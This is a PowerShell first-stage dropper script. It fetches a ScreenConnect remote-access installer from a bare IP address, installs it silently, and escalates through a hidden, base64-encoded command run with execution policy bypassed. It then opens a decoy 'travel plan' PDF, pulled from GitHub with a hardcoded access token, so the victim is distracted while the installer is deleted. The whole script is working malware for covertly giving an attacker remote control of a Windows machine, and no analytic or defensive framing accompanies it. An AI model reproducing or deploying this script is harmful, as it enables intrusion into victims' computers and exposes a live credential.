# stage1.ps1 - Reliable chain: MSI install → UAC → then PDF
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$githubToken = "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"
$gh = @{"Authorization"="token $githubToken";"Accept"="application/vnd.github.v3+json"}

# === 1. Download MSI (Invoke-WebRequest, no timeout hang) ===
$msiUrl = "http://96.30.206.19:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msiPath = Join-Path $env:TEMP "ScreenConnect.ClientSetup.msi"
try { Remove-Item $msiPath -Force } catch {}

try {
    Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -TimeoutSec 120
} catch {}

# === 2. Verify MSI downloaded ===
if (-not (Test-Path $msiPath)) { exit }
$sz = (Get-Item $msiPath).Length
if ($sz -lt 1000000) { exit }

# === 3. UAC Install ===
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
} else {
    $inner = "Start-Process 'msiexec.exe' -ArgumentList '/i `"$msiPath`" /qn /norestart' -WindowStyle Hidden -Wait"
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    Start-Process "powershell.exe" -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $enc" -Verb RunAs -Wait
}

# === 4. PDF Decoy (only after install attempt) ===
try {
    $fi = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Travel_Plan_Meeting_Q4_2026.pdf" -Headers $gh
    $pdfPath = Join-Path $env:TEMP "Travel_Plan_Meeting_Q4_2026.pdf"
    Invoke-WebRequest -Uri $fi.download_url -OutFile $pdfPath -TimeoutSec 30
    if (Test-Path $pdfPath) {
        $edge = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if (Test-Path $edge) { Start-Process $edge -ArgumentList "`"$pdfPath`"" }
    }
} catch {}

# === 5. Cleanup ===
Start-Sleep 3
try { Remove-Item $msiPath -Force } catch {}
